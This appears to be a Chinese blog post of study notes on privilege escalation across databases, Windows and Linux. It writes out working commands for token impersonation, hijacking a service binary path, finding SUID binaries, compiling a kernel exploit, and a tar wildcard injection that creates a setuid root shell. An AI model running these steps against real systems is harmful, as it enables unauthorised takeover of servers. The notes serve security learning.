<h4 id="对Oracle数据库提权分析"><a href="#对Oracle数据库提权分析" class="headerlink" title="对Oracle数据库提权分析"></a>对Oracle数据库提权分析</h4><p>e，说是用工具，那就上网找一个教程跟着一步一步来吧。<br>1、普通用户模式：<br>前提是拥有一个普通的oracle连接账号，不需要DBA权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令。<br>2、DBA用户模式：<br>拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。<br>3、注入提升模式：<br>拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61553520/article/details/130936733">https://blog.csdn.net/qq_61553520/article/details/130936733</a><br><code>安利</code><br>数据库提权姿势：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63844103/article/details/128951265">https://blog.csdn.net/qq_63844103/article/details/128951265</a></p>
<h4 id="对Redis数据库权限提升分析"><a href="#对Redis数据库权限提升分析" class="headerlink" title="对Redis数据库权限提升分析"></a>对Redis数据库权限提升分析</h4><p>Redis服务因配置不当，可被攻击者恶意利用。黑客借助Redis内置命令，可将现有数据恶意清空；如果Redis以root身份运行，黑客可往服务器上写入SSH公钥文件，直接登录服务器。<br><code>连接</code><br>未授权漏洞或密码（备份文件|数据库配置文件去获得密码之类的）<br><code>提权</code><br>利用如下方法提权<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/fly_hps/article/details/80937837">https://blog.csdn.net/fly_hps/article/details/80937837</a><br>(1).利用计划任务执行命令反弹shell<br>(2).写ssh-keygen公钥然后使用私钥登陆<br><code>修复方案：</code><br>注意：以下操作，均需重启Redis后才能生效。<br>绑定需要访问数据库的IP（防止外联）。将127.0.0.1修改为需要访问此数据库的IP地址。<br>设置访问密码（防止未授权漏洞）。在Redis.conf中requirepass字段后，设置添加访问密码。<br>修改Redis服务运行账号。以较低权限账号运行Redis服务，禁用账号的登录权限。 </p>
<h4 id="对postgresql数据库权限提升分析"><a href="#对postgresql数据库权限提升分析" class="headerlink" title="对postgresql数据库权限提升分析"></a>对postgresql数据库权限提升分析</h4><p>1、直接exp<br>CVE-2018-1058：普通用户<br>CVE-2019-9193：高权限<br><code>熟知各种数据库最高权限的用户名</code></p>
<h4 id="Windowas2008令牌窃取权限提升"><a href="#Windowas2008令牌窃取权限提升" class="headerlink" title="Windowas2008令牌窃取权限提升"></a>Windowas2008令牌窃取权限提升</h4><p>（本身具有一定权限-即非webshell权限，是主机的某一个用户的权限）<br>1、进行远程过程调用时请求提升权限，然后调用它从而生成特权安全今牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。<br>2、本地提权实验:获取会话-利用模块-窃取令牌-提权<br>3、其实就是本地提权，就是得到了对方主机的本机权限之后，此权限不是administrator&#x2F;system，利用这个令牌窃取，把用户权限提升到高权限。<br><code>针对win2008之前的os</code></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> incognito <span class="comment">#进入incognito模块</span></span><br><span class="line">list_tokens -u <span class="comment">#列出令牌</span></span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> </span><br></pre></td></tr></table></figure>
<p><code>这个还可以，后期配合其他的提权方法可以直接提到stystem</code></p>
<h4 id="windows2003-10进程注入提升"><a href="#windows2003-10进程注入提升" class="headerlink" title="windows2003&amp;10进程注入提升"></a>windows2003&amp;10进程注入提升</h4><p>进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用在windows2008之前操作系统上所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统</p>
<h2 id="权限提升-烂土豆-dll劫持-引号路径-服务权限"><a href="#权限提升-烂土豆-dll劫持-引号路径-服务权限" class="headerlink" title="权限提升|烂土豆|dll劫持|引号路径|服务权限"></a>权限提升|烂土豆|dll劫持|引号路径|服务权限</h2><h3 id="权限提升-大纲-完整"><a href="#权限提升-大纲-完整" class="headerlink" title="权限提升|大纲|完整"></a>权限提升|大纲|完整</h3><p><img src="https://pic.imgdb.cn/item/656855b8c458853aef03b63c.webp"></p>
<h3 id="具体分析-2"><a href="#具体分析-2" class="headerlink" title="具体分析"></a>具体分析</h3><h4 id="烂土豆提权-web"><a href="#烂土豆提权-web" class="headerlink" title="烂土豆提权-web"></a>烂土豆提权-web</h4><p><code>1、RottenPotato(烂土豆)提权的原理简述如下：</code><br>1.欺骗“NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。<br>2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。<br>3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。<br>总结：一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。<br><code>2、烂土豆比热土豆的优点是：</code><br>1.100%可靠<br>2.（当时）全版本通杀<br>3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用<br>总之，烂土豆是通过中间人攻击，将COM(NT\SYSTEM权限)在第二步挑战应答过程中认证的区块改为自己的区块获取SYSTEM权限，然后利用msf的模仿令牌功能模仿SYSTEM令牌。<br><code>3、关于烂土豆的必备知识点</code><br><code>令牌窃取配合烂土豆提权可以直接从web权限提升至system权限</code><br>单纯令牌窃取：本地提权<br>如配合烂土豆提权：有Web或数据库等权限（才可以通过webshell-&gt;system，进行烂土豆提权）<br><code>即令牌窃取需要一定本地权限，只有webshell权限不可以提权至system。但是配合烂土豆可以实现</code><br><code>过程：</code>上传msf产生的后门-开启监听-上传烂土豆-执行烂土豆-利用窃取模块（令牌窃取）-窃取SYSTEM-成功</p>
<h4 id="DLL劫持提权应用配合MSF"><a href="#DLL劫持提权应用配合MSF" class="headerlink" title="DLL劫持提权应用配合MSF"></a>DLL劫持提权应用配合MSF</h4><p>(复杂|鸡肋|需要特定软件在对方服务器上运行)-Web权限<br>原理<br>dll劫持提权需要特定软件应用的控制权限及启用配合<br>原理：Windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：<br>1、应用程序加载的目录<br>2、C:\Windows\System32<br>3、C:\Windows\System<br>4、C:\Windows<br>5、当前工作目录Current Working Directory，CWD<br>6、在PATH环境变量的目录（先系统后用户）<br>我们可以下一个火绒剑，看一下程序在运行时调用了哪些dll文件。<br><code>过程：信息收集（收集服务器上的第三方软件）-进程调试（程序在运行时调用哪些dll）-msf制作dll并上传-替换dll并在msf上监听-（管理员）启动应用后成功提权</code><br><code>dll劫持也可以配合令牌窃取获取system权限</code></p>
<h4 id="不带引号服务路径配合MSF-Web-本地权限"><a href="#不带引号服务路径配合MSF-Web-本地权限" class="headerlink" title="不带引号服务路径配合MSF-Web,本地权限"></a>不带引号服务路径配合MSF-Web,本地权限</h4><p><code>前置</code><br>C:\Program Files<br>在服务中，若不带引号且带有空格即不是“C:\Program Files”这样的，那么files会被认为是参数，程序就不能正确运行。<br><code>原理：</code><br>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。<br><code>过程：</code><br>检测引号服务路径-利用路径制作文件并上传-启用服务（得是管理员用户-什么类型的用户启动，对应的就是什么权限）或重启-调用后成功<br><code>如何检测引号服务路径？</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd执行：</span><br><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i <span class="string">&quot;Auto&quot;</span> |findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span>|findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>会自动返回调用执行程序时没用引号的，而且还需要在其中找出路径中有空格的。<br><code>continue</code><br>然后继续往下走，把生成的后门文件（.exe）名字换成空格前面，放进对应的硬盘，在启动服务或重启时，系统就会认为空格前面的是程序，后面全都是参数，故而执行了这个后门文件，完成提权。</p>
<h4 id="不安全的服务权限配合MSF-本地权限"><a href="#不安全的服务权限配合MSF-本地权限" class="headerlink" title="不安全的服务权限配合MSF-本地权限"></a>不安全的服务权限配合MSF-本地权限</h4><p><code>原理：</code>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。<br><code>过程：</code>检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功<br><code>检测服务权限配置（查看当前用户（组）有哪些权限--执行命令检测，检测当前用户可以操作的服务项）:</code></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesschk<span class="selector-class">.exe</span> -uwcqv <span class="string">&quot;[你可以操作的用户组]&quot;</span> *</span><br></pre></td></tr></table></figure>
<p>返回的是当前组可以操作的服务，没有则失败（直接可以结束了）<br><code>制作文件并上传：</code>上传木马文件<br><code>更改服务路径指向：</code>将一个有权限操作的服务项的路径指向更改为木马</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc<span class="built_in"> config </span><span class="string">&quot;[服务项名]&quot;</span> <span class="attribute">binpath</span>=<span class="string">&quot;[木马文件和它的完整路径]&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>调用后成功：</code>注意调用的是服务项</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> <span class="string">&quot;[服务名]&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="总结Windows提权知识点："><a href="#总结Windows提权知识点：" class="headerlink" title="总结Windows提权知识点："></a>总结Windows提权知识点：</h2><p><code>提权方法对应层面</code><br>Web：SYSTEM&gt;Administrators&gt;Users&gt;default apppool（web权限）<br>本地：域管理员&gt;计算机用户（一般在内网渗透）<br><code>不同的提权方法用在不同的层面:</code>web&#x2F;本地<br><code>提权方法对应系统版本</code><br>有些方法只针对部分系统<br><code>相关文件及后门免杀问题等</code><br>防止木马文件被杀毒、安全软件干掉</p>
<h1 id="对linux操作系统进行分析"><a href="#对linux操作系统进行分析" class="headerlink" title="对linux操作系统进行分析"></a>对linux操作系统进行分析</h1><h2 id="linux系统提权-内核漏洞-SUID-信息收集"><a href="#linux系统提权-内核漏洞-SUID-信息收集" class="headerlink" title="linux系统提权|内核漏洞|SUID|信息收集"></a>linux系统提权|内核漏洞|SUID|信息收集</h2><h3 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h3><p><code>环境：</code>和windows一样，分为web与本地权限。<br><img src="https://pic.imgdb.cn/item/656af32ac458853aef03f70f.webp"></p>
<h3 id="具体分析-3"><a href="#具体分析-3" class="headerlink" title="具体分析"></a>具体分析</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p><code>1、手工(敲命令行)|脚本</code><br>这里直接介绍用自动脚本收集信息(好东西)<br>两个信息收集：LinEnum、linuxprivchecker<br>两个漏洞探针：linux-exploit-suggester、linux-exploit-suggester2<br><code>信息收集有什么用？</code><br>信息收集为后续提权做准备<br><code>漏洞探针又有什么用？</code><br>主要用于内核提权，判定操作系统上可能存在的漏洞<br><code>2、LinEnum</code><br>需要通过webshell权限或文件上传权限上传“LinEnum.sh”到“tmp”文件夹下,执行即可<br><code>3、linuxprivchecker</code><br>需要通过webshell权限或文件上传权限上传“linuxprivchecker.py”到“tmp”文件夹下，还需要目标机器上有python<br>来到“tmp”目录下，执行文件python linuxprivchecker.py<br><code>4、linux-exploit-suggester</code><br>需要通过webshell权限或文件上传权限上传“linux-exploit-suggester.sh”到“tmp”文件夹下<br>来到“tmp”目录下，执行文件<br>.&#x2F;linux-exploit-suggester.sh|sh linux-exploit-suggester.sh<br><code>5、linux-exploit-suggester2</code><br>需要通过webshell权限或文件上传权限上传“linux-exploit-suggester-2.pl”到“tmp”文件夹下，还需要目标机器上有perl（一种脚本语言）<br>来到“tmp”目录下，执行文件<br>perl linux-exploit-suggester-2.pl</p>
<h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>SUID<br>SUID是一种特殊权限。设置了SUID的程序文件，在用户执行该程序时，用户的权限是该程序文件属主的权限。<br>比如“&#x2F;usr&#x2F;bin&#x2F;passwd”文件，普通用户执行它时，本来是以普通用户的权限启动的；chomd u+s后，获得了root权限，从而能够更改密码。<br><code>SUID提权：就是用户跨越了权限进行执行</code><br>“chmod u+s [文件名]”给予suid权限，“u-s”删除<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/166468556">https://zhuanlan.zhihu.com/p/166468556</a><br><code>具体该怎么用</code><br>漏洞成因：存在有SUID权限的全局命令（如复制、查找）<br>提权过程：探针是否有SUID(手工或脚本)-特定SUID利用-利用吃瓜<br>确定是否有SUID，利用脚本或下面的命令手工确定<br>    find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null<br>    find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<br>    find &#x2F; -user root -perm -4000 -exec ls -ldb {} ;<br>在找出来的SUID中找Nmap、Vim、find、Bash、More、Less、Nano、cp–<code>原理就是这几个命令如果被赋予了suid，那么就算是普通用户输入这几句话，也会以root权限打开，这就造成了提权。</code><br><code>题外话：看课的时候，看到可以用冰蝎连接靶机的后门，然后直接反弹shell到攻击机(nc)。</code><br>大牛文章（关于SUID提权详细操作）:<a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p>
<h4 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h4><p><code>Linux提权本地配合内核漏洞（exp利用）-p62：40：00</code><br>提权过程：本地用户连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-提权成功<br>连接，下载或上传探测漏洞的脚本，并运行<br>根据提示的漏洞信息下载或上传EXP，这里EXP文件的名字叫“45010.c”，使用EXP</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="number">45010</span>.<span class="keyword">c</span> -o <span class="number">45010</span></span><br><span class="line">chmod +<span class="keyword">x</span> <span class="number">45010</span></span><br><span class="line">./<span class="number">45010</span></span><br></pre></td></tr></table></figure>
<p>最后确定是否提权成功<br>id</p>
<h2 id="linux系统提权-定时任务-环境变量-数据库"><a href="#linux系统提权-定时任务-环境变量-数据库" class="headerlink" title="linux系统提权|定时任务|环境变量|数据库"></a>linux系统提权|定时任务|环境变量|数据库</h2><p>Linux权限<br>用户的权限用“id”命令来查看，权限分为uid、gid、groups，即属主、属组、其他<br>文件的权限又分为rwx，即读、写、执行，由三组二进制数据表示</p>
<h3 id="Linux提权本地环境变量安全（配合SUID）"><a href="#Linux提权本地环境变量安全（配合SUID）" class="headerlink" title="Linux提权本地环境变量安全（配合SUID）"></a>Linux提权本地环境变量安全（配合SUID）</h3><p>背景：sh是一个系统命令，正常来说，用户要使用的话直接sh就可以调用，但是我尝试了一下，在bin目录下，sh和.&#x2F;sh都可以调出sh界面；但是在其他目录下，.&#x2F;sh不能成功执行。原因就是环境变量的问题，设置的环境变量就是sh对应到&#x2F;bin目录下的sh可执行文件，而.&#x2F;sh是执行当前目录下的sh文件。<br><code>提权条件：系统的某一条指令复制了SUID权限（参考SUID提权），还需要本地用户权限</code><br>提权原理：借环境变量的执行顺序，替换了高权限的命令，获取权限。<br>替换命令的方法是借助环境变量会逐个文件夹找命令的运行逻辑，在被执行的命令之前就加一个同名的环境变量<br>提权过程：手写调用文件-编译-复制文件（默认被指向的，中转–自己上传的文件执行，自己上传的三者都要给予SUID权限–777）-增加环境变量-执行触发</p>
<h3 id="Linux提权本地定时任务安全"><a href="#Linux提权本地定时任务安全" class="headerlink" title="Linux提权本地定时任务安全"></a>Linux提权本地定时任务安全</h3><p>（通过恶意篡改定时任务实现SUID提权）<br><code>第一种：</code>命令问题（WS注入，主要是参数可以实现自定义）<br>提权条件：有通配符的可以调用其他命令的命令被放入计划任务中，而且命令支持存在参数<br>提权原理：利用通配符配合命令参数自定义命令实现提权<br>可以将通配符所匹配的内容写成命令的参数，调用其他命令<br>比如说，一个定时备份的脚本要备份某一个目录的所有文件，</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> cd <span class="regexp">/home/u</span>ndead<span class="regexp">/script;tar czf /</span>tmp/backup.tar.gz *</span><br></pre></td></tr></table></figure>
<p>注意到上面那个*了吗，意思是所有文件。想象一下，假设有两个文件都为空，–checkpoint-action&#x3D;exec&#x3D;sh test.sh（执行）和–checkpoint&#x3D;1（显示进度）是要被打包的，这两个文件在打包的命令就会成为打包命令的参数，而–checkpoint-action&#x3D;exec&#x3D;sh test.sh是为了执行test.sh这个文件。<br>生成test.sh:</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; <span class="regexp">/home/u</span>ndead<span class="regexp">/script/</span>test.sh/</span><br></pre></td></tr></table></figure>
<p>test.sh的内容：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> &#x27;cp <span class="string">/bin/bash</span> <span class="string">/tmp/bash</span>; chmod +s <span class="string">/tmp/bash</span>&#x27;</span><br></pre></td></tr></table></figure>
<p>就帮助我们以root去执行上述命令了，接下来调用已经获得root权限的bash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bash -p</span><br></pre></td></tr></table></figure>
<p>完成提权。<br><code>第二种：</code>权限问题<br>提权原理：利用不安全的权限分配操作导致的定时文件覆盖<br>管理员没有正确的赋予权限，比如给了文件777的权限，导致定时任务（一般是sh脚本）可以被修改，那我们就可以插入恶意代码。<br><code>第三种：</code>路径问题<br>提权原理：利用计划任务指向的文件的相对路径解析问题<br>计划任务使用相对路径来指定命令时，默认路径是“&#x2F;usr&#x2F;local&#x2F;bin”。在当前用户的目录下创建相同名字的文件，会比默认路径优先级更高</p>
<h2 id="Linux提权提升简单总结归类"><a href="#Linux提权提升简单总结归类" class="headerlink" title="Linux提权提升简单总结归类"></a>Linux提权提升简单总结归类</h2><p>1.提权环境（web环境、本地环境），信息收集（SUID、定时任务、可能漏洞、第三方服务应用等）<br>2.最新相关漏洞要明确（因为工具不可能第一时间更新），二次开发相关脚本学会展望（四个脚本）<br>3.最新漏洞：本地searchsploit脚本及远程exploitdb站点搜索说明（简要使用）<br>4.其他提权方法如：密码复用，guid，sudo等说明（运气，同理，鸡肋等） </p>
<p><code>资源：</code><br>火绒剑（HRSword）：<a target="_blank" rel="noopener" href="https://www.sdbeta.com/wg/2020/0628/235361.html">https://www.sdbeta.com/wg/2020/0628/235361.html</a><br>AccessChk：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a><br>exploit database：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br>RAVEN: 2（vulnhub的靶场）：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a> </p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">权限提升</a></div><div class="post_share"><div class="social-share" data-image="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/30/tuijian/" title="一些俺觉得挺有用的文章分享"><img class="cover" src="https://pic.imgdb.cn/item/6545b9a8c458853aefbbd923.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">一些俺觉得挺有用的文章分享</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/21/jwt/" title="JWT"><img class="cover" src="/img/preview.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JWT</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">DralinF</div><div class="author-info__description">A Little Blog Of Dralin</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fzsecurity-github"><i class="fab fa-github"></i><span>Come with me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2786245981@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=2786245981&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my little world</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E9%80%9A%E8%BF%87%E5%90%8E%E5%8F%B0%E8%8E%B7%E5%8F%96webshell-%E5%A4%A7%E7%BA%B2"><span class="toc-text">权限提升|通过后台获取webshell|大纲</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90"><span class="toc-text">具体分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%B9windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-text">对windows操作系统进行分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E-ps%E6%8F%90%E6%9D%83"><span class="toc-text">权限提升|win溢出漏洞|ps提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%85%E5%A4%87%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-text">必备知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90-1"><span class="toc-text">具体分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-text">权限提升|数据库权限提升|令牌窃取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%A4%A7%E7%BA%B2"><span class="toc-text">数据库提权|大纲</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90"><span class="toc-text">数据库提权|具体分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8Emysql%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90"><span class="toc-text">对于mysql的数据库提权分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9mssql%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90"><span class="toc-text">对mssql的数据库提权分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90"><span class="toc-text">对Oracle数据库提权分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9Redis%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%88%86%E6%9E%90"><span class="toc-text">对Redis数据库权限提升分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9postgresql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%88%86%E6%9E%90"><span class="toc-text">对postgresql数据库权限提升分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windowas2008%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">Windowas2008令牌窃取权限提升</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#windows2003-10%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8F%90%E5%8D%87"><span class="toc-text">windows2003&amp;10进程注入提升</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%83%82%E5%9C%9F%E8%B1%86-dll%E5%8A%AB%E6%8C%81-%E5%BC%95%E5%8F%B7%E8%B7%AF%E5%BE%84-%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-text">权限提升|烂土豆|dll劫持|引号路径|服务权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E5%A4%A7%E7%BA%B2-%E5%AE%8C%E6%95%B4"><span class="toc-text">权限提升|大纲|完整</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%86%E6%9E%90-2"><span class="toc-text">具体分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83-web"><span class="toc-text">烂土豆提权-web</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DLL%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83%E5%BA%94%E7%94%A8%E9%85%8D%E5%90%88MSF"><span class="toc-text">DLL劫持提权应用配合MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E9%85%8D%E5%90%88MSF-Web-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90"><span class="toc-text">不带引号服务路径配合MSF-Web,本地权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E5%90%88MSF-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90"><span class="toc-text">不安全的服务权限配合MSF-本地权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93Windows%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-text">总结Windows提权知识点：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%B9linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-text">对linux操作系统进行分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 